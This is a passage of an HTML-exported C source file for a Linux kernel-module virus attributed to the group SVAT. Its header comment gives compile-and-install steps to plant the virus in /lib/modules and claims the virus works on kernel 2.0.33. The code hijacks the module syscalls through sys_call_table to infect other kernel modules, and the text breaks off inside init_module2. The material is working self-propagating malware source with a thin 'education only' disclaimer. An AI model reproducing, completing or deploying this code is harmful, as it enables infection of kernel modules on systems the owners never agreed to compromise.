<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc12 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">/*      SVAT - Special Virii And Trojans - present:
 *
 * -=-=-=-=-=-=- the k0dy-projekt, virii phor unix systems -=-=-=-=-=-=-=-
 *
 * 0kay guys, here we go...
 * As i told you with VLP I (we try to write an fast-infector)
 * here's the result:
 * a full, non-overwriting module infector that catches
 * lkm's due to create_module() and infects them (max. 7)
 * if someone calls delete_module() [even on autoclean].
 * Linux is not longer a virii-secure system :(
 * and BSD follows next week ...
 * Since it is not needed 2 get root (by the module) you should pay
 * attention on liane.
 * Note the asm code in function init_module().
 * U should assemble your /usr/src/.../module.c with -S and your CFLAG
 * from your Makefile and look for the returnvalue from the first call
 * of find_module() in sys_init_module(). look where its stored (%ebp for me)
 * and change it in __asm__ init_module()! (but may it is not needed)
 *
 * For education only! 
 * Run it only with permisson of the owner of the system you are logged on!!! 
 * 
 *      !!! YOU USE THIS AT YOUR OWN RISK !!!
 *
 * I'm not responsible for any damage you maybe get due to playing around with this. 
 *
 * okay guys, you have to find out some steps without my help:
 *
 *  1. $ cc -c -O2 module.c
 *  2. get length of module.o and patch the #define MODLEN in module.c
 *  3. $ ???
 *      4. $ cat /lib/modules/2.0.33/fs/fat.o &gt;&gt; module.o 
 *  5. $ mv module.o /lib/modules/2.0.33/fs/fat.o
 *  &gt;AND NOW, IF YOU REALLY WANT TO START THE VIRUS:&lt; 
 *  6. $ insmod ???
 * 
 * This lkm-virus was tested on a RedHat 4.0 system with 80486-CPU and
 * kernel 2.0.33. It works.
 *
 *  greets  (in no order...)
 *  &lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;
 *
 *  NetW0rker   - tkx for da sources
 *  Serialkiller    - gib mir mal deine eMail-addy
 *  hyperSlash  - 1st SVAT member, he ?
 *  naleZ       - hehehe
 *  MadMan      - NetW0rker wanted me to greet u !?
 *  KilJaeden   - TurboDebugger and SoftIce are a good choice !
 *
 *  and all de otherz
 *
 *  Stealthf0rk/SVAT &lt;stealth@cyberspace.org&gt;
 */</span><span class="sc0">

</span><span class="sc9">#define __KERNEL__
#define MODULE
#define MODLEN 6196
#define ENOUGH 7
#define BEGIN_KMEM {unsigned long old_fs=get_fs();set_fs(get_ds());
#define END_KMEM   set_fs(old_fs);}
</span><span class="sc0">

</span><span class="sc1">/* i'm not sure we need all of 'em ...*/</span><span class="sc0">

</span><span class="sc9">#include &lt;linux/version.h&gt;
#include &lt;linux/mm.h&gt;
#include &lt;linux/unistd.h&gt;
#include &lt;linux/fs.h&gt;
#include &lt;linux/types.h&gt;
#include &lt;asm/errno.h&gt;
#include &lt;asm/string.h&gt;
#include &lt;linux/fcntl.h&gt;
#include &lt;sys/syscall.h&gt;
#include &lt;linux/module.h&gt;
#include &lt;linux/malloc.h&gt;
#include &lt;linux/kernel.h&gt;
#include &lt;linux/kerneld.h&gt;
</span><span class="sc0">
</span><span class="sc9">#define __NR_our_syscall 211
#define MAXPATH 30
</span><span class="sc1">/*#define DEBUG*/</span><span class="sc0">
</span><span class="sc9">#ifdef DEBUG
</span><span class="sc0">   </span><span class="sc9">#define DPRINTK(format, args...) printk(KERN_INFO format,##args)
#else
</span><span class="sc0">   </span><span class="sc9">#define DPRINTK(format, args...)
#endif
</span><span class="sc0">
</span><span class="sc1">/* where the sys_calls are */</span><span class="sc0">

</span><span class="sc16">extern</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">sys_call_table</span><span class="sc10">[];</span><span class="sc0">

</span><span class="sc1">/* tested only with kernel 2.0.33, but thiz should run under 2.x.x
 * if you change the default_path[] values 
 */</span><span class="sc0">

</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">default_path</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc6">"."</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"/linux/modules"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"/lib/modules/2.0.33/fs"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"/lib/modules/2.0.33/net"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"/lib/modules/2.0.33/scsi"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"/lib/modules/2.0.33/block"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"/lib/modules/2.0.33/cdrom"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"/lib/modules/2.0.33/ipv4"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"/lib/modules/2.0.33/misc"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"/lib/modules/default/fs"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"/lib/modules/default/net"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"/lib/modules/default/scsi"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"/lib/modules/default/block"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"/lib/modules/default/cdrom"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"/lib/modules/default/ipv4"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"/lib/modules/default/misc"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"/lib/modules/fs"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"/lib/modules/net"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"/lib/modules/scsi"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"/lib/modules/block"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"/lib/modules/cdrom"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"/lib/modules/ipv4"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"/lib/modules/misc"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc4">0</span><span class="sc0">
</span><span class="sc10">};</span><span class="sc0">

</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">symbol_table</span><span class="sc0"> </span><span class="sc11">my_symtab</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc9">#include &lt;linux/symtab_begin.h&gt;
</span><span class="sc0">    </span><span class="sc11">X</span><span class="sc10">(</span><span class="sc11">printk</span><span class="sc10">),</span><span class="sc0">
        </span><span class="sc11">X</span><span class="sc10">(</span><span class="sc11">vmalloc</span><span class="sc10">),</span><span class="sc0">
        </span><span class="sc11">X</span><span class="sc10">(</span><span class="sc11">vfree</span><span class="sc10">),</span><span class="sc0">
        </span><span class="sc11">X</span><span class="sc10">(</span><span class="sc11">kerneld_send</span><span class="sc10">),</span><span class="sc0">
        </span><span class="sc11">X</span><span class="sc10">(</span><span class="sc11">current_set</span><span class="sc10">),</span><span class="sc0">
        </span><span class="sc11">X</span><span class="sc10">(</span><span class="sc11">sys_call_table</span><span class="sc10">),</span><span class="sc0">
        </span><span class="sc11">X</span><span class="sc10">(</span><span class="sc11">register_symtab_from</span><span class="sc10">),</span><span class="sc0">
        </span><span class="sc9">#include &lt;linux/symtab_end.h&gt;
</span><span class="sc10">};</span><span class="sc0">

</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">files2infect</span><span class="sc10">[</span><span class="sc4">7</span><span class="sc10">][</span><span class="sc4">60</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">];</span><span class="sc0">

</span><span class="sc1">/* const char kernel_version[] = UTS_RELEASE; */</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc10">(*</span><span class="sc11">old_create_module</span><span class="sc10">)(</span><span class="sc16">char</span><span class="sc10">*,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc10">(*</span><span class="sc11">old_delete_module</span><span class="sc10">)(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*);</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc10">(*</span><span class="sc11">open</span><span class="sc10">)(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc10">(*</span><span class="sc11">close</span><span class="sc10">)(</span><span class="sc16">int</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc10">(*</span><span class="sc11">unlink</span><span class="sc10">)(</span><span class="sc16">char</span><span class="sc10">*);</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">our_syscall</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">infectfile</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*);</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">is_infected</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*);</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">cp</span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">file</span><span class="sc10">*,</span><span class="sc0"> </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">file</span><span class="sc10">*);</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">writeVir</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*);</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">init_module2</span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">module</span><span class="sc10">*);</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">get_mod_name</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc10">*);</span><span class="sc0">

</span><span class="sc1">/* needed to be global */</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">VirCode</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc1">/* install new syscall to see if we are already in kmem */</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">our_syscall</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">mn</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc1">/* magic number: 40hex :-) */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">mn</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0x40</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">else</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc11">ENOSYS</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">new_create_module</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">size</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">retval</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
        
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">retval</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">old_create_module</span><span class="sc10">(</span><span class="sc11">name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">size</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">retval</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc1">/* find next free place */</span><span class="sc0">
        </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">files2infect</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">][</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">7</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">6</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">retval</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc1">/* get name of mod from user-space */</span><span class="sc0">
        </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">files2infect</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">][</span><span class="sc11">j</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">get_fs_byte</span><span class="sc10">(</span><span class="sc11">name</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">60</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc11">j</span><span class="sc10">++;</span><span class="sc0">
    </span><span class="sc11">DPRINTK</span><span class="sc10">(</span><span class="sc6">"in new_create_module: got %s as #%d\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">files2infect</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">retval</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* we infect modules after sys_delete_module, to be sure
 * we don't confuse the kernel
 */</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">new_delete_module</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">modname</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">infected</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">retval</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">s</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">name</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
        
        
        </span><span class="sc11">retval</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">old_delete_module</span><span class="sc10">(</span><span class="sc11">modname</span><span class="sc10">);</span><span class="sc0"> 

        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">name</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc10">*)</span><span class="sc11">vmalloc</span><span class="sc10">(</span><span class="sc11">MAXPATH</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">60</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">retval</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">files2infect</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">][</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">7</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">files2infect</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc6">".o"</span><span class="sc10">);</span><span class="sc0"> 
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">s</span><span class="sc0">  </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">get_mod_name</span><span class="sc10">(</span><span class="sc11">files2infect</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]))</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">retval</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc11">name</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">is_infected</span><span class="sc10">(</span><span class="sc11">name</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">DPRINTK</span><span class="sc10">(</span><span class="sc6">"try 2 infect %s as #%d\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc11">infected</span><span class="sc10">++;</span><span class="sc0">
                        </span><span class="sc11">infectfile</span><span class="sc10">(</span><span class="sc11">name</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc11">memset</span><span class="sc10">(</span><span class="sc11">files2infect</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">60</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc1">/* for */</span><span class="sc0">
        </span><span class="sc1">/* its enough */</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">infected</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc11">ENOUGH</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc11">cleanup_module</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc11">vfree</span><span class="sc10">(</span><span class="sc11">name</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">retval</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc1">/* lets take a look at sys_init_module(), that calls
 * our init_module() compiled with
 * CFLAG = ... -O2 -fomit-frame-pointer
 * in C:
 * ...
 * if((mp = find_module(name)) == NULL)
 * ...
 *
 * is in asm:
 * ...
 * call find_module
 * movl %eax, %ebp
 * ...
 * note that there is no normal stack frame !!!
 * thats the reason, why we find 'mp' (return from find_module) in %ebp
 * BUT only when compiled with the fomit-frame-pointer option !!!
 * with a stackframe (pushl %ebp; movl %esp, %ebp; subl $124, %esp)
 * you should find mp at -4(%ebp) .
 * thiz is very bad hijacking of local vars and an own topic.
 * I hope you do not get an seg. fault.
 */</span><span class="sc0">

</span><span class="sc11">__asm__</span><span class="sc0"> 
</span><span class="sc10">(</span><span class="sc12">"
</span><span class="sc0">
</span><span class="sc10">.</span><span class="sc11">align</span><span class="sc0"> </span><span class="sc4">16</span><span class="sc0">
</span><span class="sc10">.</span><span class="sc11">globl</span><span class="sc0"> </span><span class="sc11">init_module</span><span class="sc0">  
   </span><span class="sc10">.</span><span class="sc11">type</span><span class="sc0"> </span><span class="sc11">init_module</span><span class="sc10">,</span><span class="sc11">@function</span><span class="sc0">

</span><span class="sc11">init_module</span><span class="sc10">:</span><span class="sc0">
        </span><span class="sc11">pushl</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc11">ebp</span><span class="sc0">       </span><span class="sc1">/* ebp is a pointer to mp from sys_init_module() */</span><span class="sc0">
                             </span><span class="sc1">/* and the parameter for init_module2() */</span><span class="sc0">
        </span><span class="sc11">call</span><span class="sc0"> </span><span class="sc11">init_module2</span><span class="sc0">        
        </span><span class="sc11">popl</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc11">eax</span><span class="sc0">
        </span><span class="sc11">xorl</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc11">eax</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc11">eax</span><span class="sc0">      </span><span class="sc1">/* all good */</span><span class="sc0">
        </span><span class="sc11">ret</span><span class="sc0">                  </span><span class="sc1">/* and return */</span><span class="sc0">
</span><span class="sc10">.</span><span class="sc11">hype27</span><span class="sc10">:</span><span class="sc0">
    </span><span class="sc10">.</span><span class="sc11">size</span><span class="sc0"> </span><span class="sc11">init_module</span><span class="sc10">,.</span><span class="sc11">hype27</span><span class="sc10">-</span><span class="sc11">init_module</span><span class="sc0">
</span><span class="sc12">");
</span><span class="sc0">        
 </span><span class="sc1">/* for the one with no -fomit-frame-pointer and no -O2 this should (!) work:
  *
  * pushl %ebx
  * movl %ebp, %ebx
  * pushl -4(%ebx)
  * call init_module2
  * addl $4, %esp
  * xorl %eax, %eax
  * popl %ebx
  * ret
  */</span><span class="sc0">

</span><span class="sc1">/*----------------------------------------------*/</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">init_module2</span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">module</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">mp</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">       
        </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">s</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">mod</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">modname</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">state</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
   
        </span><span class="sc11">mod</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">vmalloc</span><span class="sc10">(</span><span class="sc4">60</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">modname</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">vmalloc</span><span class="sc10">(</span><span class="sc11">MAXPATH</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">60</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">mod</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">!</span><span class="sc11">modname</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">        
        </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">mod</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">mp</span><span class="sc10">-&gt;</span><span class="sc11">name</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">mod</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">".o"</span><span class="sc10">);</span><span class="sc0">

    
        </span><span class="sc11">MOD_INC_USE_COUNT</span><span class="sc10">;</span><span class="sc0">        
        </span><span class="sc11">DPRINTK</span><span class="sc10">(</span><span class="sc6">"in init_module2: mod = %s\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">mod</span><span class="sc10">);</span><span class="sc0">
        
        </span><span class="sc1">/* take also a look at phrack#52 ...*/</span><span class="sc0">
        </span><span class="sc11">mp</span><span class="sc10">-&gt;</span><span class="sc11">name</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">mp</span><span class="sc10">-&gt;</span><span class="sc11">ref</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">mp</span><span class="sc10">-&gt;</span><span class="sc11">size</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc1">/* thiz is our new main ,look for copys in kmem ! */</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sys_call_table</span><span class="sc10">[</span><span class="sc11">__NR_our_syscall</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">    
        </span><span class="sc11">old_delete_module</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">sys_call_table</span><span class="sc10">[</span><span class="sc11">__NR_delete_module</span><span class="sc10">];</span><span class="sc0">  
